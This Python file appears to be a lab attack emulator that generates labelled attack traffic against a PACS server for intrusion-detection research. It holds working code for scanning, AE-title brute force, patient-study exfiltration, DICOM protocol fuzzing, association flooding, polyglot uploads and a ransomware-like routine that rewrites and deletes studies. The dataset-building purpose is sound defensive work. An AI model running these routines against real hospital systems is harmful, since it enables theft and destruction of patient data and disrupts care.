"""Lab-only attack emulation for the VitalGate test bed. Written independently of the training lab: scans use nmap,
DICOM attacks use DCMTK tools, raw PDUs are built from the DICOM PS3.8 layout with Python stdlib.
Targets ONLY the PACS on its own isolated Docker network. Writes one ground-truth row per run to /out/truth.csv.
novel=True marks techniques that never appeared in the training data for that class (for honest reporting)."""
import argparse, json, os, random, shutil, socket, struct, tempfile, threading, time, urllib.request
from common import *

AET_SELF = os.environ.get("AET", "")                 # the compromised device's own AE title (if any)
MOVE_PORT = os.environ.get("MOVE_PORT", "")
F = {"high": 0.2, "low": 1.0, "slow": 5.0}           # pacing factor per intensity
WORDS = ["ORTHANC", "PACS", "ARCHIVE", "STORESCP", "ANY-SCP", "DCM4CHEE", "CONQUEST", "SERVER", "PACS1", "MAIN",
         "RADIOLOGY", "IMAGING", "VNA", "QR_SCP", "DICOM", "STORE", "MAINPACS", "PACS_MAIN", "RAD_ARCHIVE", "IMGSRV"]


def stealth_ae():
    return random.choice(["RADVIEW", "WS", "READ", "VIEWER", "RAD"]) + "%02d" % random.randrange(100)


def left(stop):
    return max(5, int(stop - time.time()))


def nap(base, it):
    time.sleep(base * F[it] * random.uniform(0.6, 1.4))


# ------------------------------------------------------------------------------------------- raw DICOM PDUs
def item(t, body):
    return bytes([t, 0]) + struct.pack(">H", len(body)) + body


def assoc_rq(called, calling, abstract="1.2.840.10008.1.1", ts="1.2.840.10008.1.2", maxlen=16384, version=1):
    app = item(0x10, b"1.2.840.10008.3.1.1.1")
    pc = item(0x20, bytes([1, 0, 0, 0]) + item(0x30, abstract.encode()) + item(0x40, ts.encode()))
    ui = item(0x50, item(0x51, struct.pack(">I", maxlen)) + item(0x52, b"1.2.826.0.1.3680043.9.7433.1.1"))
    body = (struct.pack(">HH", version, 0) + called.encode().ljust(16)[:16] + calling.encode().ljust(16)[:16]
            + b"\x00" * 32 + app + pc + ui)
    return bytes([1, 0]) + struct.pack(">I", len(body)) + body


def mutate_rq():
    rq = bytearray(assoc_rq(AEC, stealth_ae()))
    k = random.choice(["version", "len_big", "len_small", "truncate", "item_type", "item_len", "ae_junk"])
    if k == "version": rq[6:8] = struct.pack(">H", random.choice([0, 2, 0x7FFF]))
    elif k == "len_big": rq[2:6] = struct.pack(">I", len(rq) - 6 + random.randint(1000, 60000))
    elif k == "len_small": rq[2:6] = struct.pack(">I", random.randint(4, 60))
    elif k == "truncate": rq = rq[:random.randint(7, len(rq) - 1)]
    elif k == "item_type": rq[74] = random.choice([0x11, 0x99, 0xFF])
    elif k == "item_len": i = 74 + 4 + len(b"1.2.840.10008.3.1.1.1"); rq[i + 2:i + 4] = b"\xff\xff"
    else: rq[10:26] = os.urandom(16)
    return k, bytes(rq)


def raw(payload, hold=0.0, read=False):
    try:
        s = socket.create_connection((PACS, int(PORT)), timeout=3)
        s.sendall(payload)
        if read:
            try: s.recv(4096)
            except Exception: pass
        if hold: time.sleep(hold)
        s.close()
    except Exception:
        pass


# ------------------------------------------------------------------------------------------- A1 recon
def recon(v, it, stop):
    while time.time() < stop:
        if v == "nmap_connect":
            ports, tim = {"high": ("1-3000", "-T4"), "low": ("1-1000", "-T3"), "slow": ("1-300", "-T2")}[it]
            cmd = ["nmap", "-sT", "-Pn", "-n", "--max-retries", "1", tim, "-p", ports, PACS]
        elif v == "nmap_syn":
            cmd = ["nmap", "-sS", "-Pn", "-n", "--max-retries", "1", "-T4" if it == "high" else "-T3",
                   "--top-ports", "2000" if it == "high" else "500", PACS]
        else:                                                    # dicom_ping: DICOM-aware service discovery
            cmd = ["nmap", "-sT", "-Pn", "-n", "-p", f"{PORT},104,4242,11112,8042", "--script", "dicom-ping", PACS]
        run(cmd, left(stop))
        nap(2, it)


# ------------------------------------------------------------------------------------------- A2 AE brute force
def bruteforce(v, it, stop):
    words = WORDS[:] + ["".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ_") for _ in range(random.randint(4, 10))) for _ in range(30)]
    random.shuffle(words)
    if random.random() < 0.5: words.insert(random.randint(5, len(words) - 1), AEC)       # sometimes it finds it
    def worker():
        while time.time() < stop:
            aec = random.choice(words)
            if v == "echo_guess":
                run(["echoscu", "-aet", stealth_ae(), "-aec", aec, "-to", "5", PACS, PORT], 15)
            else:                                                # find_guess: guess via query associations
                run(["findscu", "-S", "-to", "5", "-aet", stealth_ae(), "-aec", aec, "-k", "QueryRetrieveLevel=STUDY",
                     "-k", "PatientName=*", PACS, PORT], 15)
            nap(0.15, it)
    n = {"high": 6, "low": 2, "slow": 1}[it]
    ts = [threading.Thread(target=worker) for _ in range(n)]; [t.start() for t in ts]; [t.join() for t in ts]


# ------------------------------------------------------------------------------------------- A3 exfiltration
def pull(aet, st_uid, move=False):
    d = tempfile.mkdtemp(prefix="x_", dir="/tmp")
    if move:
        cmd = ["movescu", "-S", "-aet", aet, "-aem", aet, "-aec", AEC, "--port", MOVE_PORT, "-od", d, "-to", "30",
               "-k", "QueryRetrieveLevel=STUDY", "-k", f"StudyInstanceUID={st_uid}", PACS, PORT]
    else:
        cmd = ["getscu", "-S", "-aet", aet, "-aec", AEC, "-od", d, "-to", "30",
               "-k", "QueryRetrieveLevel=STUDY", "-k", f"StudyInstanceUID={st_uid}", PACS, PORT]
    run(cmd, 300)
    return d


def exfiltration(v, it, stop):
    move = v == "move_to_self"
    if move and not (AET_SELF and MOVE_PORT):
        raise SystemExit("move_to_self must run on a workstation with AET and MOVE_PORT (C-MOVE destination)")
    aet = AET_SELF if move else stealth_ae()
    while time.time() < stop:
        _, uids = find_studies(aet, "*")
        random.shuffle(uids)
        for u in uids:
            if time.time() > stop: break
            shutil.rmtree(pull(aet, u, move), ignore_errors=True)
            nap(random.uniform(20, 60) if v == "drip" else 0.5, it)
        nap(3, it)


# ------------------------------------------------------------------------------------------- A4 malformed PDUs
def malformed(v, it, stop):
    while time.time() < stop:
        if v == "assoc_fuzz":
            _, p = mutate_rq(); raw(p, hold=random.choice([0, 0, 0.5]))
        else:                                                    # pdata_fuzz: valid association, then broken P-DATA
            try:
                s = socket.create_connection((PACS, int(PORT)), timeout=3)
                s.sendall(assoc_rq(AEC, stealth_ae())); s.recv(4096)
                body = os.urandom(random.randint(16, 400))
                pdv = struct.pack(">I", len(body) + random.choice([2, 5000, 0x7FFFFFF0])) + bytes([1, random.choice([0, 3, 0xFF])]) + body
                s.sendall(bytes([4, 0]) + struct.pack(">I", len(pdv)) + pdv)
                time.sleep(0.2); s.close()
            except Exception:
                pass
        nap(0.3, it)


# ------------------------------------------------------------------------------------------- A5 association flood
def flood(v, it, stop):
    if v == "echo_storm":
        def worker():
            while time.time() < stop:
                run(["echoscu", "-aet", stealth_ae(), "-aec", AEC, "-to", "5", PACS, PORT], 10); nap(0.05, it)
        n = {"high": 24, "low": 6, "slow": 2}[it]
        ts = [threading.Thread(target=worker) for _ in range(n)]; [t.start() for t in ts]; [t.join() for t in ts]
        return
    target = {"high": 250, "low": 40, "slow": 15}[it]             # hold_full_rq: complete RQ, then never proceed
    socks = []
    while time.time() < stop:
        socks = [s for s in socks if s.fileno() != -1]
        while len(socks) < target and time.time() < stop:
            try:
                s = socket.create_connection((PACS, int(PORT)), timeout=2)
                s.sendall(assoc_rq(AEC, stealth_ae())); socks.append(s)
            except Exception:
                break
            nap(0.02, it)
        for s in list(socks):                                     # drop the ones the PACS closed (ARTIM timeout)
            s.setblocking(False)
            try:
                if s.recv(4096) == b"": s.close()
            except BlockingIOError: pass
            except Exception: s.close()
        time.sleep(1)
    for s in socks:
        try: s.close()
        except Exception: pass


# ------------------------------------------------------------------------------------------- A6 polyglot upload
def polyglot_file(kind):
    _, lib = lib_files(enc="raw")
    d = tempfile.mkdtemp(prefix="p_", dir="/tmp"); f = os.path.join(d, "x.dcm"); shutil.copy(random.choice(lib), f)
    run(["dcmodify", "-nb", "-gin", "-gst", "-gse", "-m", "(0010,0010)=TB^POLY", f])
    data = bytearray(open(f, "rb").read()); shutil.rmtree(d, ignore_errors=True)
    head = b"MZ\x90\x00\x03\x00\x00\x00" if kind == "mz" else b"\x7fELF\x02\x01\x01\x00"   # inert markers only
    data[0:128] = head + b"\x00" * (128 - len(head))
    return bytes(data)


def post(path, body, ctype):
    try:
        req = urllib.request.Request(f"http://{PACS}:{HTTP}{path}", data=body, headers={"Content-Type": ctype})
        urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        pass


def polyglot(v, it, stop):
    while time.time() < stop:
        if v == "rest_mz":
            post("/instances", polyglot_file("mz"), "application/dicom")
        elif v == "rest_elf":
            post("/instances", polyglot_file("elf"), "application/dicom")
        else:                                                    # stow_mz: DICOMweb STOW-RS multipart upload
            b = "vg" + uid()[-12:]
            body = (f"--{b}\r\nContent-Type: application/dicom\r\n\r\n").encode() + polyglot_file("mz") + f"\r\n--{b}--\r\n".encode()
            post("/dicom-web/studies", body, f'multipart/related; type="application/dicom"; boundary={b}')
        nap(2, it)


# ------------------------------------------------------------------------------------------- A7 ransomware-like
def rest(method, path, body=None):
    try:
        req = urllib.request.Request(f"http://{PACS}:{HTTP}{path}", data=body, method=method)
        return urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        return b""


def ransomware(v, it, stop):
    aet = stealth_ae()
    while time.time() < stop:
        _, uids = find_studies(aet, "*"); random.shuffle(uids)
        for u in uids[:{"high": 8, "low": 3, "slow": 2}[it]]:
            if time.time() > stop: break
            d = pull(aet, u)
            files = [os.path.join(d, f) for f in os.listdir(d)]
            if files:
                run(["dcmodify", "-nb", "-gin", "-m", f"(0020,000d)={uid()}", "-m", f"(0020,000e)={uid()}",
                     "-m", "(0010,0010)=LOCKED^" + uid()[-6:], *files])
                run(["storescu", "-aet", aet, "-aec", AEC, "-to", "30", PACS, PORT, *files], left(stop))
                if v == "get_restore_delete":
                    try:
                        for hit in json.loads(rest("POST", "/tools/lookup", u.encode()) or b"[]"):
                            if hit.get("Type") == "Study": rest("DELETE", "/studies/" + hit["ID"])
                    except Exception:
                        pass
            shutil.rmtree(d, ignore_errors=True)
            nap(1, it)
        nap(2, it)


VARIANTS = {   # class -> {variant: (function, novel)}
    "recon": {"nmap_connect": (recon, False), "nmap_syn": (recon, True), "dicom_ping": (recon, True)},
    "ae_bruteforce": {"echo_guess": (bruteforce, False), "find_guess": (bruteforce, True)},
    "exfiltration": {"find_get": (exfiltration, False), "move_to_self": (exfiltration, True), "drip": (exfiltration, True)},
    "malformed_pdu": {"assoc_fuzz": (malformed, False), "pdata_fuzz": (malformed, True)},
    "assoc_flood": {"hold_full_rq": (flood, False), "echo_storm": (flood, True)},
    "preamble_polyglot": {"rest_mz": (polyglot, False), "rest_elf": (polyglot, True), "stow_mz": (polyglot, True)},
    "ransomware_like": {"get_restore": (ransomware, False), "get_restore_delete": (ransomware, True)},
}

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("label_class", choices=sorted(VARIANTS)); p.add_argument("variant")
    p.add_argument("--intensity", choices=["low", "high", "slow"], default="low")
    p.add_argument("--duration", type=int, default=90); p.add_argument("--run-id", default="tb_0001")
    p.add_argument("--list", action="store_true")
    a = p.parse_args()
    fn, novel = VARIANTS[a.label_class][a.variant]
    t0 = time.time()
    try:
        fn(a.variant, a.intensity, t0 + a.duration)
    finally:
        truth(run_id=a.run_id, site=SITE, label_class=a.label_class, variant=a.variant, novel=int(novel),
              intensity=a.intensity, src_ip=my_ip(), src_host=socket.gethostname(), dst_ip=socket.gethostbyname(PACS),
              start_ts=round(t0, 3), end_ts=round(time.time(), 3))
        log(role="attacker", label_class=a.label_class, variant=a.variant, intensity=a.intensity, novel=novel)
